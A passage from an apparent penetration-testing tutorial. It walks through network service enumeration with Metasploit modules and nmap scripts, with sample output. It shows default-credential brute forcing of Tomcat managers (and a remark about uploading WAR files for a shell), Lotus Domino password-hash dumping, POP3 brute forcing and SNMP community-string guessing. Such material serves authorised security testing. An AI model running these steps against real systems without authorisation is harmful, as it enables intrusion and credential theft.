</span><span class='line'>10.10.xx.xx   8080  tcp    http      open   Apache-Coyote/1.1 ( 401-Basic realm="Tomcat Manager Application" )
</span><span class='line'>10.10.xx.xx   8080  tcp    http      open   Apache-Coyote/1.1 ( 401-Basic realm="Tomcat Manager Application" )
</span><span class='line'>10.10.xx.xx   8080  tcp    http      open   Apache-Coyote/1.1 ( 401-Basic realm="Tomcat Manager Application" )
</span><span class='line'>10.10.xx.xx   8080  tcp    http      open   Apache-Coyote/1.1 ( 401-Basic realm="Tomcat Manager Application" )
</span><span class='line'>10.10.xx.xx    8080  tcp    http      open   Apache-Coyote/1.1 ( 401-Basic realm="Tomcat Manager Application" )
</span><span class='line'>10.10.xx.xx   1311  tcp    ssl/http  open   Apache Tomcat/Coyote JSP engine 1.1
</span><span class='line'>10.10.xx.xx   80    tcp    http      open   Apache Tomcat/Coyote JSP engine 1.1
</span><span class='line'>10.10.xx.xx   80    tcp    http      open   Apache-Coyote/1.1 ( 401-Basic realm="Tomcat Manager Application" )
</span><span class='line'>10.10.xx.xx  1311  tcp    ssl/http  open   Apache Tomcat/Coyote JSP engine 1.1
</span><span class='line'>10.10.xx.xx  8443  tcp    ssl/http  open   Apache Tomcat/Coyote JSP engine 1.1
</span><span class='line'>10.10.xx.xx  80    tcp    http      open   Apache-Coyote/1.1 ( 401-Basic realm="Tomcat Manager Application" )
</span><span class='line'>10.17.xx.xx   8081  tcp    http      open   Apache-Coyote/1.1 ( 401-Basic realm="Tomcat Manager Application" )
</span><span class='line'>10.23.xx.xx    8080  tcp    http      open   Apache Tomcat/Coyote JSP engine 1.1
</span><span class='line'>10.25.xx.xx    8080  tcp    http      open   Apache-Coyote/1.1 ( 401-Basic realm="Tomcat Manager Application" )
</span><span class='line'>10.87.xx.xx   8080  tcp    http      open   Apache Tomcat/Coyote JSP engine 1.1
</span><span class='line'>10.87.xx.xx    8081  tcp    http      open   Apache Tomcat/Coyote JSP engine 1.1
</span><span class='line'>10.87.xx.xx   8080  tcp    http      open   Apache-Coyote/1.1 ( 401-Basic realm="Tomcat Manager Application" )
</span><span class='line'>10.87.xx.xx   8080  tcp    http      open   Apache Tomcat/Coyote JSP engine 1.1</span></code></pre></td></tr></table></div></figure>
We get multiple tomcat manager applications running. Let's see what we have for Tomcat

<ul>
<li>
<strong>Tomcat Application Manager Login Utility</strong> which checks for default tomcat username and passwords
using the above module
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/http/tomcat_mgr_login
</span><span class='line'>services -p 8080 -S "Tomcat Manager" -R
</span><span class='line'>
</span><span class='line'>Run the scan for other ports also above 8443, 80, 1311, 8081 :)</span></code></pre></td></tr></table></div></figure>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[-] 10.25.xx.xx:8080 TOMCAT_MGR - LOGIN FAILED: QCC:QLogic66 (Incorrect: )
</span><span class='line'>[*] Scanned 6 of 7 hosts (85% complete)
</span><span class='line'>[+] 10.87.xx.xx:8080 - LOGIN SUCCESSFUL: admin:admin
</span><span class='line'>[+] 10.10.xx.xx:80 - LOGIN SUCCESSFUL: tomcat:tomcat</span></code></pre></td></tr></table></div></figure>
</li>
</ul>
Yay :) We got two apache tomcat we can upload WAR files and get shell ;)

</li>
<li>
Searching for <strong>Canon</strong>

found a interesting module <strong>Canon Printer Wireless Configuration Disclosure</strong> enumerates wireless credentials from Canon printers with 
  a web interface. It has been tested on Canon models: MG3100, MG5300, MG6100, MP495, MX340, MX870, MX890, MX920. We still need to figure out what is Options.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/http/canon_wireless</span></code></pre></td></tr></table></div></figure>
Sample Output
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[-] 10.23.xx.xx:80 File not found
</span><span class='line'>[+] 10.23.xx.xx:80 Option: 
</span><span class='line'>[-] 10.23.xx.xx:80 Could not determine LAN Settings.</span></code></pre></td></tr></table></div></figure>

</li>
<li><strong>Lotus Domino httpd</strong>
Searching for Lotus Domino we got few modules
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>   auxiliary/scanner/lotus/lotus_domino_hashes                               normal     Lotus Domino Password Hash Collector
</span><span class='line'>   auxiliary/scanner/lotus/lotus_domino_login                                normal     Lotus Domino Brute Force Utility
</span><span class='line'>   auxiliary/scanner/lotus/lotus_domino_version                              normal     Lotus Domino Version</span></code></pre></td></tr></table></div></figure>
Let's try them one by one

<strong>Lotus Domino Version</strong> which determines Lotus Domino Server Version by several checks.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/lotus/lotus_domino_version
</span><span class='line'>services -p 80 -S "Lotus" -R</span></code></pre></td></tr></table></div></figure>
Sample output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[*] 10.10.xx.xx:80 Lotus Domino Base Install Version: ["9.0.0.0"]</span></code></pre></td></tr></table></div></figure>
Let's try <strong>Lotus Domino Login</strong> which is Lotus Domino Authentication Brute Force Utility with our default passwords.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/lotus/lotus_domino_login
</span><span class='line'>services -p 80 -S "Lotus" -R
</span><span class='line'>set USERNAME admin
</span><span class='line'>set PAsSwoRD example@123</span></code></pre></td></tr></table></div></figure>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[*] 10.10.xx.xx:80 LOTUS_DOMINO - [1/1] - Lotus Domino - Trying username:'admin' with password:'example@123'
</span><span class='line'>[+] http://10.10.xx.xx:80 - Lotus Domino - SUCCESSFUL login for 'admin' : 'example@123</span></code></pre></td></tr></table></div></figure>
Using the above credentials we can use lotus_domino_hashes (Lotus Domino Password Hash Collector) module to download user hashes.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/lotus/lotus_domino_hashes
</span><span class='line'>services -p 80 -S "Lotus" -R
</span><span class='line'>set NOTES_USER admin
</span><span class='line'>set NOTES_PASS example@123</span></code></pre></td></tr></table></div></figure>
Sample Output
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[*] http://10.10.xx.xx:80 - Lotus Domino - Trying dump password hashes with given credentials
</span><span class='line'>[+] http://10.10.xx.xx:80 - Lotus Domino - SUCCESSFUL authentication for 'admin'
</span><span class='line'>[*] http://10.10.xx.xx:80 - Lotus Domino - Getting password hashes
</span><span class='line'>[+] http://10.10.xx.xx:80 - Lotus Domino - Account Found: nadmin, notesadmin@example.com, (GEo1MDjKxxxxxxxxxxx)(GEo1MDjKxxxxxxxxxxx)</span></code></pre></td></tr></table></div></figure>
</li>


<li>
For <strong>IIS</strong>

We can check if WebDAV is enabled on the websites running IIS by <strong>HTTP WebDAV Scanner</strong> which detect webservers with WebDAV enabled.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/http/webdav_scanner</span></code></pre></td></tr></table></div></figure>
Sample Output: Mostly old IIS like 5.1/6.0 would have WebDAV enabled. It is disabled by default in the newer versions.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[+] 10.87.xx.xx (Microsoft-IIS/5.1) has WEBDAV ENABLED</span></code></pre></td></tr></table></div></figure>
</li>

<li>For <strong>VMware ESXi</strong>

<ul>
<li>Let's find what version they are running by <strong>VMWare ESX/ESXi Fingerprint Scanner</strong> which accesses the web API interfaces for VMware ESX/ESXi servers and attempts to identify version information for that 
  server.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/vmware/esx_fingerprint
</span><span class='line'>services -p 80 -S VMware</span></code></pre></td></tr></table></div></figure>
Sample Output
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[+] 10.10.xx.xx:443 - Identified VMware ESXi 5.5.0 build-1623387
</span><span class='line'>[+] 10.10.xx.xx:443 - Identified VMware ESXi 5.5.0 build-1623387
</span><span class='line'>[*] Scanned  2 of 18 hosts (11% complete)
</span><span class='line'>[+] 10.10.xx.xx:443 - Identified VMware ESXi 5.1.0 build-799733
</span><span class='line'>[+] 10.10.xx.xx:443 - Identified VMware ESXi 5.5.0 build-1623387
</span><span class='line'>[*] Scanned  4 of 18 hosts (22% complete)
</span><span class='line'>[+] 10.10.xx.xx:443 - Identified VMware vCenter Server 6.0.0 build-3339083
</span><span class='line'>[*] Scanned  6 of 18 hosts (33% complete)
</span><span class='line'>[+] 10.10.xx.xx:443 - Identified VMware ESXi 6.0.0 build-3073146
</span><span class='line'>[*] Scanned  8 of 18 hosts (44% complete)
</span><span class='line'>[+] 10.10.xx.xx:443 - Identified VMware ESXi 6.0.0 build-3073146
</span><span class='line'>[*] Scanned  9 of 18 hosts (50% complete)
</span><span class='line'>[+] 10.10.xx.xx:443 - Identified VMware ESXi 6.0.0 build-3073146
</span><span class='line'>[+] 10.10.xx.xx:443 - Identified VMware ESXi 6.0.0 build-3073146
</span><span class='line'>[*] Scanned 11 of 18 hosts (61% complete)
</span><span class='line'>[+] 10.10.xx.xx:443 - Identified VMware ESXi 6.0.0 build-3073146
</span><span class='line'>[+] 10.10.xx.xx:443 - Identified VMware ESXi 6.0.0 build-3073146
</span><span class='line'>[*] Scanned 13 of 18 hosts (72% complete)
</span><span class='line'>[+] 10.10.xx.xx:443 - Identified VMware ESXi 6.0.0 build-3029758
</span><span class='line'>[+] 10.10.xx.xx:443 - Identified VMware ESXi 5.0.0 build-623860
</span><span class='line'>[*] Scanned 15 of 18 hosts (83% complete)
</span><span class='line'>[+] 10.10.xx.xx:443 - Identified VMware ESXi 5.5.0 build-1623387
</span><span class='line'>[+] 10.10.xx.xx:443 - Identified VMware ESXi 5.1.0 build-799733
</span><span class='line'>[*] Scanned 17 of 18 hosts (94% complete)
</span><span class='line'>[+] 10.10.xx.xx:443 - Identified VMware ESXi 5.1.0 build-1065491</span></code></pre></td></tr></table></div></figure>
</li>
</ul>
</li>
</ol>


<h3>Kerberos | Port 88</h3>

<p>Nmap has</p>

<ol>
<li><a href="https://nmap.org/nsedoc/scripts/krb5-enum-users.html">krb5-enum-users.nse</a>: Discovers valid usernames by brute force querying likely usernames against a Kerberos service. When an invalid username is requested the server will respond using the Kerberos error code KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN, allowing us to determine that the user name was invalid. Valid user names will illicit either the TGT in a AS-REP response or the error KRB5KDC_ERR_PREAUTH_REQUIRED, signaling that the user is required to perform pre authentication.

The script should work against Active Directory. It needs a valid Kerberos REALM in order to operate.

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='test'</span></code></pre></td></tr></table></div></figure></li>
</ol>


<h3>POP3 | Port 110</h3>

<p><strong>Metasploit</strong> has two auxiliary scanner modules</p>

<ol>
<li><strong>POP3 Banner Grabber</strong>: which is the banner grabber for pop3
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/pop3/pop3_version
</span><span class='line'>services -p 110 -R -u</span></code></pre></td></tr></table></div></figure></li>

<li><strong>POP3 Login Utility</strong>: which attempts to authenticate to an POP3 service.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/pop3/pop3_login
</span><span class='line'>services -p 110 -R -u</span></code></pre></td></tr></table></div></figure>
</li>
</ol>


<p><strong>Nmap</strong> has two NSEs</p>

<ol>
<li><a href="https://nmap.org/nsedoc/scripts/pop3-capabilities.html">pop3-capabilities.nse</a>: Retrieves POP3 email server capabilities.</li>
<li><a href="https://nmap.org/nsedoc/scripts/pop3-brute.html">pop3-brute.nse</a>: Tries to log into a POP3 account by guessing usernames and passwords.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -sV --script=pop3-brute xxx.xxx.xxx.xxx</span></code></pre></td></tr></table></div></figure>
While playing DE_ICE_S1_100, we figured out that bruteforcing POP3 service is faster than bruteforcing SSH services.
</li>
</ol>


<h3>RPCInfo | Port 111</h3>

<p>rpcinfo makes an RPC call to an RPC server and reports what it finds</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>rpcinfo -p IP_Address</span></code></pre></td></tr></table></div></figure>


<p>Sample Output:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>rpcinfo -p 10.7.xx.xx
</span><span class='line'>   program vers proto   port  service
</span><span class='line'>    100000    2   tcp    111  portmapper
</span><span class='line'>    100000    2   udp    111  portmapper
</span><span class='line'>1073741824    1   tcp    669
</span><span class='line'>1073741824    2   tcp    669
</span><span class='line'>    399929    2   tcp    631</span></code></pre></td></tr></table></div></figure>


<p>We can use <strong>NFS Mount Scanner</strong> module to check for the nfs mounts using port 111</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/nfs/nfsmount
</span><span class='line'>services -p 111 -u -R</span></code></pre></td></tr></table></div></figure>


<p>Sample Output:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[*] Scanned  24 of 240 hosts (10% complete)
</span><span class='line'>[+] 10.10.xx.xx NFS Export: /data/iso [0.0.0.0/0.0.0.0]
</span><span class='line'>[*] Scanned  48 of 240 hosts (20% complete)
</span><span class='line'>[+] 10.10.xx.xx NFS Export: /DataVolume/Public [*]
</span><span class='line'>[+] 10.10.xx.xx NFS Export: /DataVolume/Download [*]
</span><span class='line'>[+] 10.10.xx.xx NFS Export: /DataVolume/Softshare [*]
</span><span class='line'>[*] Scanned  72 of 240 hosts (30% complete)
</span><span class='line'>[+] 10.10.xx.xx NFS Export: /var/ftp/pub [10.0.0.0/255.255.255.0]
</span><span class='line'>[*] Scanned  96 of 240 hosts (40% complete)
</span><span class='line'>[+] 10.10.xx.xx NFS Export: /common []</span></code></pre></td></tr></table></div></figure>


<p></p>

<p>The same can be achieved using showmount</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>showmount -a 172.30.xx.xx
</span><span class='line'>All mount points on 172.30.xx.xx:
</span><span class='line'>172.30.xx.xx:/SSSC-LOGS
</span><span class='line'>172.30.xx.xx:/sssclogs</span></code></pre></td></tr></table></div></figure>


<p>Multiple times we have seen msf nfsmount fail because of some error, so it sometimes better to just run a for loop with showmount</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>for i in $(cat /tmp/msf-db-rhosts-20160413-2660-62cf9a); 
</span><span class='line'>do  
</span><span class='line'>  showmount -a $i &gt;&gt; nfs_111; 
</span><span class='line'>done;</span></code></pre></td></tr></table></div></figure>


<h3>Ident | Port 113</h3>

<p>If the port ident 113 is open, it might be a good idea to try pentest monkey ident-user-enum Perl Script. The same result is also achieved by nmap <a href="https://nmap.org/nsedoc/scripts/auth-owners.html">auth-owners.nse</a></p>

<p>Sample Output</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>perl ident-user-enum.pl 10.10.xx.xx 22 53 111 113 512 513 514 515
</span><span class='line'>ident-user-enum v1.0 ( http://pentestmonkey.net/tools/ident-user-enum )
</span><span class='line'>
</span><span class='line'>10.10.xx.xx:22    [U2FsdGVkX19U+FaOs8zFI+sBFw5PBF2/hxWdfeblTXM=]
</span><span class='line'>10.10.xx.xx:53    [U2FsdGVkX1+fVazmVwSBwobo05dskDNWG8mogAWzHS8=]
</span><span class='line'>10.10.xx.xx:111   [U2FsdGVkX1+GPhL0rdMggQOQmNzsxtKe+ro+YQ28nTg=]
</span><span class='line'>10.10.xx.xx:113   [U2FsdGVkX1+5f5j9c2qnHFL5XKMcLV7YjUW8LYWN1ac=]
</span><span class='line'>10.10.xx.xx:512   [U2FsdGVkX1+IWVqsWohbUhjr3PAgbkWTaImWIODMUDY=]
</span><span class='line'>10.10.xx.xx:513   [U2FsdGVkX19EEjrVAxj0lX0tTT/FoB3J9BUlfVqN3Qs=]
</span><span class='line'>10.10.xx.xx:514   [U2FsdGVkX18/o1MMaGmcU4ul7kNowuhfBgiplQZ0R5c=]
</span><span class='line'>10.10.xx.xx:515   [U2FsdGVkX1/8ef5wkL05TTMi+skSs65KRGIQB9Z8WnE=]</span></code></pre></td></tr></table></div></figure>


<p>The above are base64 encoded, when decoded results in Salted_Some_Garbage. If anyone know what it&rsquo;s appreciated.</p>

<h3>NetBios</h3>

<p>Nmap has</p>

<ol>
<li><a href="https://nmap.org/nsedoc/scripts/broadcast-netbios-master-browser.html">broadcast-netbios-master-browser.nse</a>
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap --script=broadcast-netbios-master-browser
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( https://nmap.org ) at 2016-05-03 21:31 IST
</span><span class='line'>Pre-scan script results:
</span><span class='line'>| broadcast-netbios-master-browser: 
</span><span class='line'>| ip             server      domain
</span><span class='line'>| 192.168.xx.xx  FILESRV     WORKGROUP
</span><span class='line'>|_192.168.xx.xx  XXXXCJ-NAS  VOLUME
</span><span class='line'>WARNING: No targets were specified, so 0 hosts scanned.</span></code></pre></td></tr></table></div></figure>
</li>
</ol>


<h3>SNMP | Port 161</h3>

<p><strong>Metasploit</strong> has</p>

<ol>
<li>
We can use use <strong>SNMP Community Scanner</strong> to find the machines which are having default communtites by using SNMP Community Scanner.

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/snmp/snmp_login
</span><span class='line'>services -p 161 -u -R</span></code></pre></td></tr></table></div></figure>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[+] 10.4.xx.xx:161 - LOGIN SUCCESSFUL: public (Access level: read-only); Proof (sysDescr.0): Cisco IOS Software, C1130 Software (C1130-K9W7-M), Version 12.4(10b)JA, RELEASE SOFTWARE (fc2)
</span><span class='line'>Technical Support: http://www.cisco.com/techsupport
</span><span class='line'>Copyright (c) 1986-2007 by Cisco Systems, Inc.
</span><span class='line'>Compiled Wed 24-Oct-07 15:17 by prod_rel_team
</span><span class='line'>[*] Scanned 12 of 58 hosts (20% complete)
</span><span class='line'>[*] Scanned 18 of 58 hosts (31% complete)
</span><span class='line'>[+] 10.10.xx.xx:161 - LOGIN SUCCESSFUL: public (Access level: read-only); Proof (sysDescr.0): Digi Connect ME Version 82000856_F6 07/21/2006
</span><span class='line'>[+] 10.10.xx.xx:161 - LOGIN SUCCESSFUL: public (Access level: read-only); Proof (sysDescr.0): Digi Connect ME Version 82000856_F6 07/21/2006
</span><span class='line'>[*] Scanned 24 of 58 hosts (41% complete)
</span><span class='line'>[+] 10.11.xx.xx:161 - LOGIN SUCCESSFUL: private (Access level: read-write); Proof (sysDescr.0): ExtremeXOS version 12.2.2.11 v1222b11 by release-manager on Mon Mar 23 17:54:47 PDT 2009
</span><span class='line'>[+] 10.11.xx.xx:161 - LOGIN SUCCESSFUL: public (Access level: read-only); Proof (sysDescr.0): ExtremeXOS version 12.2.2.11 v1222b11 by release-manager on Mon Mar 23 17:54:47 PDT 2009
</span><span class='line'>[+] 10.11.xx.xx:161 - LOGIN SUCCESSFUL: private (Access level: read-write); Proof (sysDescr.0): ExtremeXOS version 12.2.2.11 v1222b11 by release-manager on Mon Mar 23 17:54:47 PDT 2009
</span><span class='line'>[+] 10.11.xx.xx:161 - LOGIN SUCCESSFUL: public (Access level: read-only); Proof (sysDescr.0): ExtremeXOS version 12.2.2.11 v1222b11 by release-manager on Mon Mar 23 17:54:47 PDT 2009
</span><span class='line'>[+] 10.11.xx.xx:161 - LOGIN SUCCESSFUL: private (Access level: read-write); Proof (sysDescr.0): ExtremeXOS version 12.2.2.11 v1222b11 by release-manager on Mon Mar 23 17:54:47 PDT 2009
</span><span class='line'>[+] 10.11.xx.xx:161 - LOGIN SUCCESSFUL: public (Access level: read-only); Proof (sysDescr.0): ExtremeXOS version 12.2.2.11 v1222b11 by release-manager on Mon Mar 23 17:54:47 PDT 2009
</span><span class='line'>[*] Scanned 29 of 58 hosts (50% complete)
</span><span class='line'>[*] Scanned 35 of 58 hosts (60% complete)
</span><span class='line'>[*] Scanned 41 of 58 hosts (70% complete)
</span><span class='line'>[*] Scanned 47 of 58 hosts (81% complete)
</span><span class='line'>[+] 10.25.xx.xx:161 - LOGIN SUCCESSFUL: public (Access level: read-only); Proof (sysDescr.0): Digi Connect ME Version 82000856_F6 07/21/2006</span></code></pre></td></tr></table></div></figure>
</li>

<li>Next we can use <strong>SNMP Enumeration Module</strong> to enumerate the devices for which we have found the community strings 
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/snmp/snmp_enum
</span><span class='line'>creds -p 161 -R</span></code></pre></td></tr></table></div></figure>

Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[+] 10.11.xx.xx, Connected.
</span><span class='line'>
</span><span class='line'>[*] System information:
</span><span class='line'>
</span><span class='line'>Host IP                       : 10.11.xx.xx
</span><span class='line'>Hostname                      : X150-24t
</span><span class='line'>Description                   : ExtremeXOS version 12.2.xx.xx v1222b11 by release-manager on Mon Mar 23 17:54:47 PDT 2009
</span><span class='line'>Contact                       : support@extremenetworks.com, +1 888 257 3000
</span><span class='line'>Location                      : -
</span><span class='line'>Uptime snmp                   : -
</span><span class='line'>Uptime system                 : 206 days, 00:20:58.04
</span><span class='line'>System date                   : -
</span><span class='line'>
</span><span class='line'>[*] Network information:
</span><span class='line'>
</span><span class='line'>IP forwarding enabled         : no
</span><span class='line'>Default TTL                   : 64
</span><span class='line'>TCP segments received         : 6842
</span><span class='line'>TCP segments sent             : 6837
</span><span class='line'>TCP segments retrans          : 0
</span><span class='line'>Input datagrams               : 243052379
</span><span class='line'>Delivered datagrams           : 192775346
</span><span class='line'>Output datagrams              : 993667</span></code></pre></td></tr></table></div></figure>
</li>
</ol>


<h3>Check Point FireWall-1 Topology | Port 264</h3>

<p><strong>Metasploit</strong> has</p>

<ol>
<li><strong>CheckPoint Firewall-1 SecuRemote Topology Service Hostname Disclosure</strong> This module sends a query to the port 264/TCP on CheckPoint Firewall-1 firewalls to obtain the firewall name and management station (such as SmartCenter) name via a pre-authentication request
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/gather/checkpoint_hostname
</span><span class='line'>set RHOST 10.10.xx.xx</span></code></pre></td></tr></table></div></figure>
Sample Output
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[*] Attempting to contact Checkpoint FW1 SecuRemote Topology service...
</span><span class='line'>[+] Appears to be a CheckPoint Firewall...
</span><span class='line'>[+] Firewall Host: FIREFIGHTER-SEC
</span><span class='line'>[+] SmartCenter Host: FIREFIGHTER-MGMT.example.com
</span><span class='line'>[*] Auxiliary module execution completed</span></code></pre></td></tr></table></div></figure>
</li>
</ol>


<h3>LDAP | Port 389</h3>

<p>Nmap has</p>

<ol>
<li><a href="https://nmap.org/nsedoc/scripts/ldap-rootdse.html">ldap-rootdse.nse</a>: Retrieves the LDAP root DSA-specific Entry (DSE)
Sample Output:

